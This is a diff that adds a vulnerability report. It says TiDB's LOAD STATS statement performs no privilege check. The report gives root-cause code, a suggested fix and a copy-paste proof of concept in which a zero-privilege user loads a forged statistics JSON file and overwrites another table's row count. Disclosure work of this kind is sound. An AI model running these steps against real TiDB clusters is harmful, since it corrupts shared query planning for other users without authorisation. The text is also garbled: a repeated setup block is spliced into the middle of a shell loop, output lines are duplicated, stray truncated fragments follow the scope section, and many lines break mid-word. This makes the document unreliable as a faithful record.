@@ -1,1 +1,216 @@
-TBD
+Title: LOAD STATS performs no privilege check — any authenticated user can overwrite the optimizer statistics of any table
+
+Weakness: Missing Authorization (CWE-862)
+
+Asset in Scope: TiDB product, such as TiKV, TiDB, TiFlash, PD
+
+Description:
+Asset — pingcap/tidb — in scope via the program's OTHER: "TiDB product, such as TiKV, TiDB, TiFlash, PD"
+Affected file — pkg/planner/core/planbuilder.go:4902 (buildLoadStats)
+Confirmed on — TiDB v8.5.1, Edition Community, commit fea86c8e35ad4a86a5e1160701f99493c2ee547c
+Also present on — master @ e2cbef3 — identical code, so not already fixed upstream
+Vulnerability type — Missing authorization / missing privilege check
+CWE — CWE-862: Missing Authorization (https://cwe.mitre.org/data/definitions/862.html)
+CVSS 3.1 — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N — 4.3 (Medium)
+Reproducible — Yes — one self-contained command, exits 0 only on success. See §3.
+
+1. Summary
+
+TiDB gates every statistics-modifying statement behind a privilege check — ANALYZE TABLE, LOCK STATS, UNLOCK STATS and REFRESH STATS all verify privileges on thei
+r target tables. LOAD STATS does not.
+
+Because the target table is named inside the *loaded file* rather than in the statement, any authenticated user — including one holding no privileges whatsoever — can rep
+lace the optimizer statistics of any table in the cluster, including tables they cannot read.
+
+2. Root cause
+
+Four statistics statements are dispatched adjacently in the plan builder (pkg/planner/core/planbuilder.go:628-634). Their builders:
+
+// :4902 — LOAD STATS. No privilege check. Note the UNNAMED receiver: this function
+//         structurally cannot call b.appendVisitInfo(...), so no privilege is ever recorded.
+func (*PlanBuilder) buildLoadStats(ld *ast.LoadStatsStmt) base.Plan {
+    p := &LoadStats{Path: ld.Path}
+    return p
+}
+
+// :4907 — REFRESH STATS
+func (b *PlanBuilder) buildRefreshStats(rs *ast.RefreshStatsStmt) (base.Plan, error) {
+    ...
+    b.requireSelectOrRestoreAdminPrivForStatsObjects(rs.RefreshObjects)   // :4912
+}
+
+// :4994 — LOCK STATS   ("requires INSERT and SELECT privilege ... same as buildAnalyze")
+func (b *PlanBuilder) buildLockStats(ld *ast.LockStatsStmt) base.Plan {
+    ...
+    b.requireInsertAndSelectPriv(ld.Tables)                               // :4999
+}
+
+// :5005 — UNLOCK STATS -> b.requireInsertAndSelectPriv(ld.Tables)
+// :3208 — ANALYZE      -> b.requireInsertAndSelectPriv(as.TableNames)
+
+TiDB enforces privileges by having the planner append visitInfo, which CheckPrivilege later verifies. buildLoadStats appends none, so there is nothing to verify.
+
+The executor adds no gate either — pkg/executor/load_stats.go, LoadStatsExec.Next() only checks that the path is non-empty and stores LoadStatsInfo in a session var
+iable; Open() is a no-op.
+
+No test or document in the repository asserts any privilege requirement for LOAD STATS.
+
+3. Reproduction
+
+3.1 Environment
+
+Host OS — Kali GNU/Linux Rolling, kernel 7.1.5+kali-amd64, x86_64
+Target — TiDB v8.5.1, Edition Community
+Git commit — fea86c8e35ad4a86a5e1160701f99493c2ee547c
+Binary source — https://tiup-mirrors.pingcap.com/tidb-v8.5.1-linux-amd64.tar.gz (official PingCAP TiUP mirror)
+tidb-server sha256 — c1766ca6f54aa8700810539bfeefd788c0be5ee0c5f49ec77841524c880891f1 (240,740,760 bytes)
+Storage — --store=unistore — built-in mock storage. No PD, no TiKV, no Docker, no root.
+Client — mysql from MariaDB 11.8.8, client 15.2
+Ports — 127.0.0.1:4199 SQL, 127.0.0.1:10199 status
+
+3.2 One command
+
+./repro.sh ; echo "exit=$?"      # exit=0 only if the vulnerability reproduces
+
+3.3 Manual steps (copy-paste)
+
+Step 1 — fetch and start TiDB
+
+mkdir -p /tmp/tidb-poc && cd /tmp/tidb-poc
+curl -fsSL https://tiup-mirrors.pingcap.com/tidb-v8.5.1-linux-amd64.tar.gz | tar xz
+./tidb-server --store=unistore --path=/tmp/tidb-poc/data \
+              -P 4199 --status=10199 --host=127.0.0.1 &
+sleep 5
+
+Step 2 — create a victim table and a user with zero privileges (as root)
+
+mysql -h127.0.0.1 -P4199 -uroot -e "
+CREATE DATABASE victimdb;
+CREATE TABLE victimdb.secret_t(id INT PRIMARY KEY, v VARCHAR(32));
+INSERT INTO victimdb.secret_t VALUES (1,'a'),(2,'b');
+CREATE USER 'lowpriv'@'%';
+ANALYZE TABLE victimdb.secret_t;
+SHOW GRANTS FOR 'lowpriv'@'%';"
+
+Expected: GRANT USAGE ON *.* TO 'lowpriv'@'%' — no privileges at all.
+
+Step 3 — confirm the user is powerless (negative control)
+
+for s in "SELECT * FROM victimdb.secret_t" \
+         "ANALYZE TABLE victimdb.secret_t" \
+         "LOCK STATS victimdb.secret_t" \
+mysql -h127.0.0.1 -P4199 -uroot -e "
+CREATE DATABASE victimdb;
+CREATE TABLE victimdb.secret_t(id INT PRIMARY KEY, v VARCHAR(32));
+INSERT INTO victimdb.secret_t VALUES (1,'a'),(2,'b');
+CREATE USER 'lowpriv'@'%';
+ANALYZE TABLE victimdb.secret_t;
+SHOW GRANTS FOR 'lowpriv'@'%';"
+
+Expected: GRANT USAGE ON *.* TO 'lowpriv'@'%' — no privileges at all.
+
+Step 3 — confirm the user is powerless (negative control)
+
+for s in "SELECT * FROM victimdb.secret_t" \
+         "ANALYZE TABLE victimdb.secret_t" \
+         "LOCK STATS victimdb.secret_t" \
+         "UNLOCK STATS victimdb.secret_t"; do
+  echo "--- $s"
+  mysql -h127.0.0.1 -P4199 -ulowpriv -e "$s" 2>&1 | grep ERROR
+done
+
+Expected: ERROR 1142 for all four.
+
+Step 4 — attacker payload (hand-written; no privileged access needed)
+
+cat > /tmp/evil.json <<'JSON'
+{"database_name":"victimdb","table_name":"secret_t","columns":{},"indices":{},
+ "count":777000777,"modify_count":0,"version":1}
+JSON
+
+Step 5 — exploit as the zero-privilege user
+
+mysql -h127.0.0.1 -P4199 -ulowpriv -e "LOAD STATS '/tmp/evil.json'"
+
+Expected: no error — the statement succeeds.
+
+Step 6 — verify the unauthorized modification (as root)
+
+mysql -h127.0.0.1 -P4199 -uroot -e \
+  "SHOW STATS_META WHERE db_name='victimdb' AND table_name='secret_t';"
+
+Expected: Row_count = 777000777 (was 2).
+
+Cleanup
+
+mysql -h127.0.0.1 -P4199 -uroot -e "DROP DATABASE victimdb; DROP USER 'lowpriv'@'%';"
+pkill -f 'tidb-server --store=unistore'
+
+3.4 Verified output
+
+   Release Version: v8.5.1
+   Git Commit Hash: fea86c8e35ad4a86a5e1160701f99493c2ee547c
+   grants: GRANT USAGE ON *.* TO 'lowpriv'@'%'
+   SELECT * FROM victimdb.secret_t        -> ERROR 1142
+   ANALYZE TABLE victimdb.secret_t        -> ERROR 1142
+   LOCK STATS victimdb.secret_t           -> ERROR 1142
+   UNLOCK STATS victimdb.secret_t         -> ERROR 1142
+   LOAD STATS as lowpriv -> '<no error>'
+   Row_count: 2  ->  777000777
+   ✅ REPRODUCED: a USAGE-only user rewrote statistics for a table it cannot SELECT.
+SCRIPT EXIT CODE: 0
+   ✅ REPRODUCED: a USAGE-only user rewrote statistics for a table it cannot SELECT.
+SCRIPT EXIT CODE: 0
+
+Reproduced 3/3 times on fresh state, each run using a separate database, a separate user, and a distinct canary value (900000004, 900000005, 900000006).
+
+4. What this is not
+
+Stated explicitly so severity is not overestimated:
+
+- Not a server-side arbitrary file read. pkg/server/conn.go:2431-2450 requires the client to advertise mysql.ClientLocalFiles and then calls cc.getDataFromPath
+— the LOCAL INFILE path. The file is supplied by the client, so no server file is read. (The attacker controls their own client, so this is not a mitigation, but it i
+s not a file-disclosure primitive either.)
+- Not remote-unauthenticated. A valid session is required — but any session will do, including one with no grants.
+- Not a denial-of-service report. The defect is the missing authorization check.
+
+5. Suggested fix
+
+Give buildLoadStats a named receiver and apply the same gate as its siblings:
+
+func (b *PlanBuilder) buildLoadStats(ld *ast.LoadStatsStmt) base.Plan {
+    p := &LoadStats{Path: ld.Path}
+    // Loading statistics replaces optimizer metadata for the tables named in the
+    // payload; require the same privileges as ANALYZE / LOCK STATS / UNLOCK STATS.
+    b.requireInsertAndSelectPriv(/* tables named by the payload */)
+    return p
+}
+
+Because the target tables are only known once the file is parsed, the check must be enforced where the payload is applied — LoadStatsInfo.Update() — verifying INSERT+SE
+LECT on each table named in the file, and rejecting the load otherwise. A dynamic privilege (in the style of RESTORE_ADMIN) would also be defensible.
+
+Suggested regression test: a user with no grants must receive ERROR 1142 from LOAD STATS for a payload naming a table they cannot access.
+
+6. Scope and conduct
+
+Testing was performed entirely against a local instance of TiDB v8.5.1 started on the researcher's own machine from the official PingCAP distribution. No request wa
+s sent to any PingCAP-operated system, no third-party data was accessed, and nothing was modified outside the local test instance, which was destroyed after testing.
+{"database_name":"victimdb","table_name":"s
+
+mysql -h127.0.0.1 -P4199 -ulowpriv -e "LOAD
+
+Impact:
+Impact
+
+An authenticated user with no privileges on the target table can replace that table's optimizer statistics.
+
+TiDB's cost-based optimizer consumes these statistics cluster-wide. Setting a two-row table's row count to ~7.8×10⁸ causes systematically wrong plan selection — index ver
+sus full scan, join order, and join algorithm — for every user querying that table, not only the attacker.
+
+The target table is chosen by the contents of the loaded file, not by the statement, so any table in the cluster can be targeted by name.
+
+This is reported as unauthorized modification of shared metadata, not as denial of service. The defect is the absent authorization check; it is demonstrated by direct
+ contrast with four sibling statements that do enforce one.
+
+Proof of Concept:
+(See the proof-of-concept files included in this folder.)
